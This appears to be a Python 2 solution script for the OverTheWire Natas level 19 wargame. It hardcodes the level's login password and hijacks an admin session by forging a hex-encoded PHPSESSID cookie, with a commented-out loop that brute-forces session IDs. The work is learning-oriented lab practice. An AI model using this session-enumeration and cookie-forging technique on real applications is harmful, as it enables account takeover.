#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

usn = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
#url = "http://%s.natas.labs.overthewire.org/index-source.html" % usn
url = "http://%s.natas.labs.overthewire.org/" % usn
login = (usn, password)



##uncomment following lines after finding PHPSESSID from for loop
session = requests.Session()   
connection = session.get(url, cookies = { "PHPSESSID" : str("%d-admin" % 281).encode('hex')}, auth = login)   
print connection.text




#for i in range(641):
    #session = requests.Session()
   # print {"PHPSESSID" : str("%d-admin" % i).encode('hex')}
    #connection = session.post(url, data = { "username" : "tylerptl", "password": "zombocom"}, auth = login)
    #connection = session.get(url, cookies = {"PHPSESSID" : str("%d-admin" % i).encode('hex')}, auth = login)



    #print session.cookies["PHPSESSID"].decode('hex')   ## works w/post
    #pageContent = connection.text



    #if ("regular"  not in pageContent):
     #   print "===================="
     #   print "Admin ID found " , i
     #   print "===================="
      #  break
    #print pageContent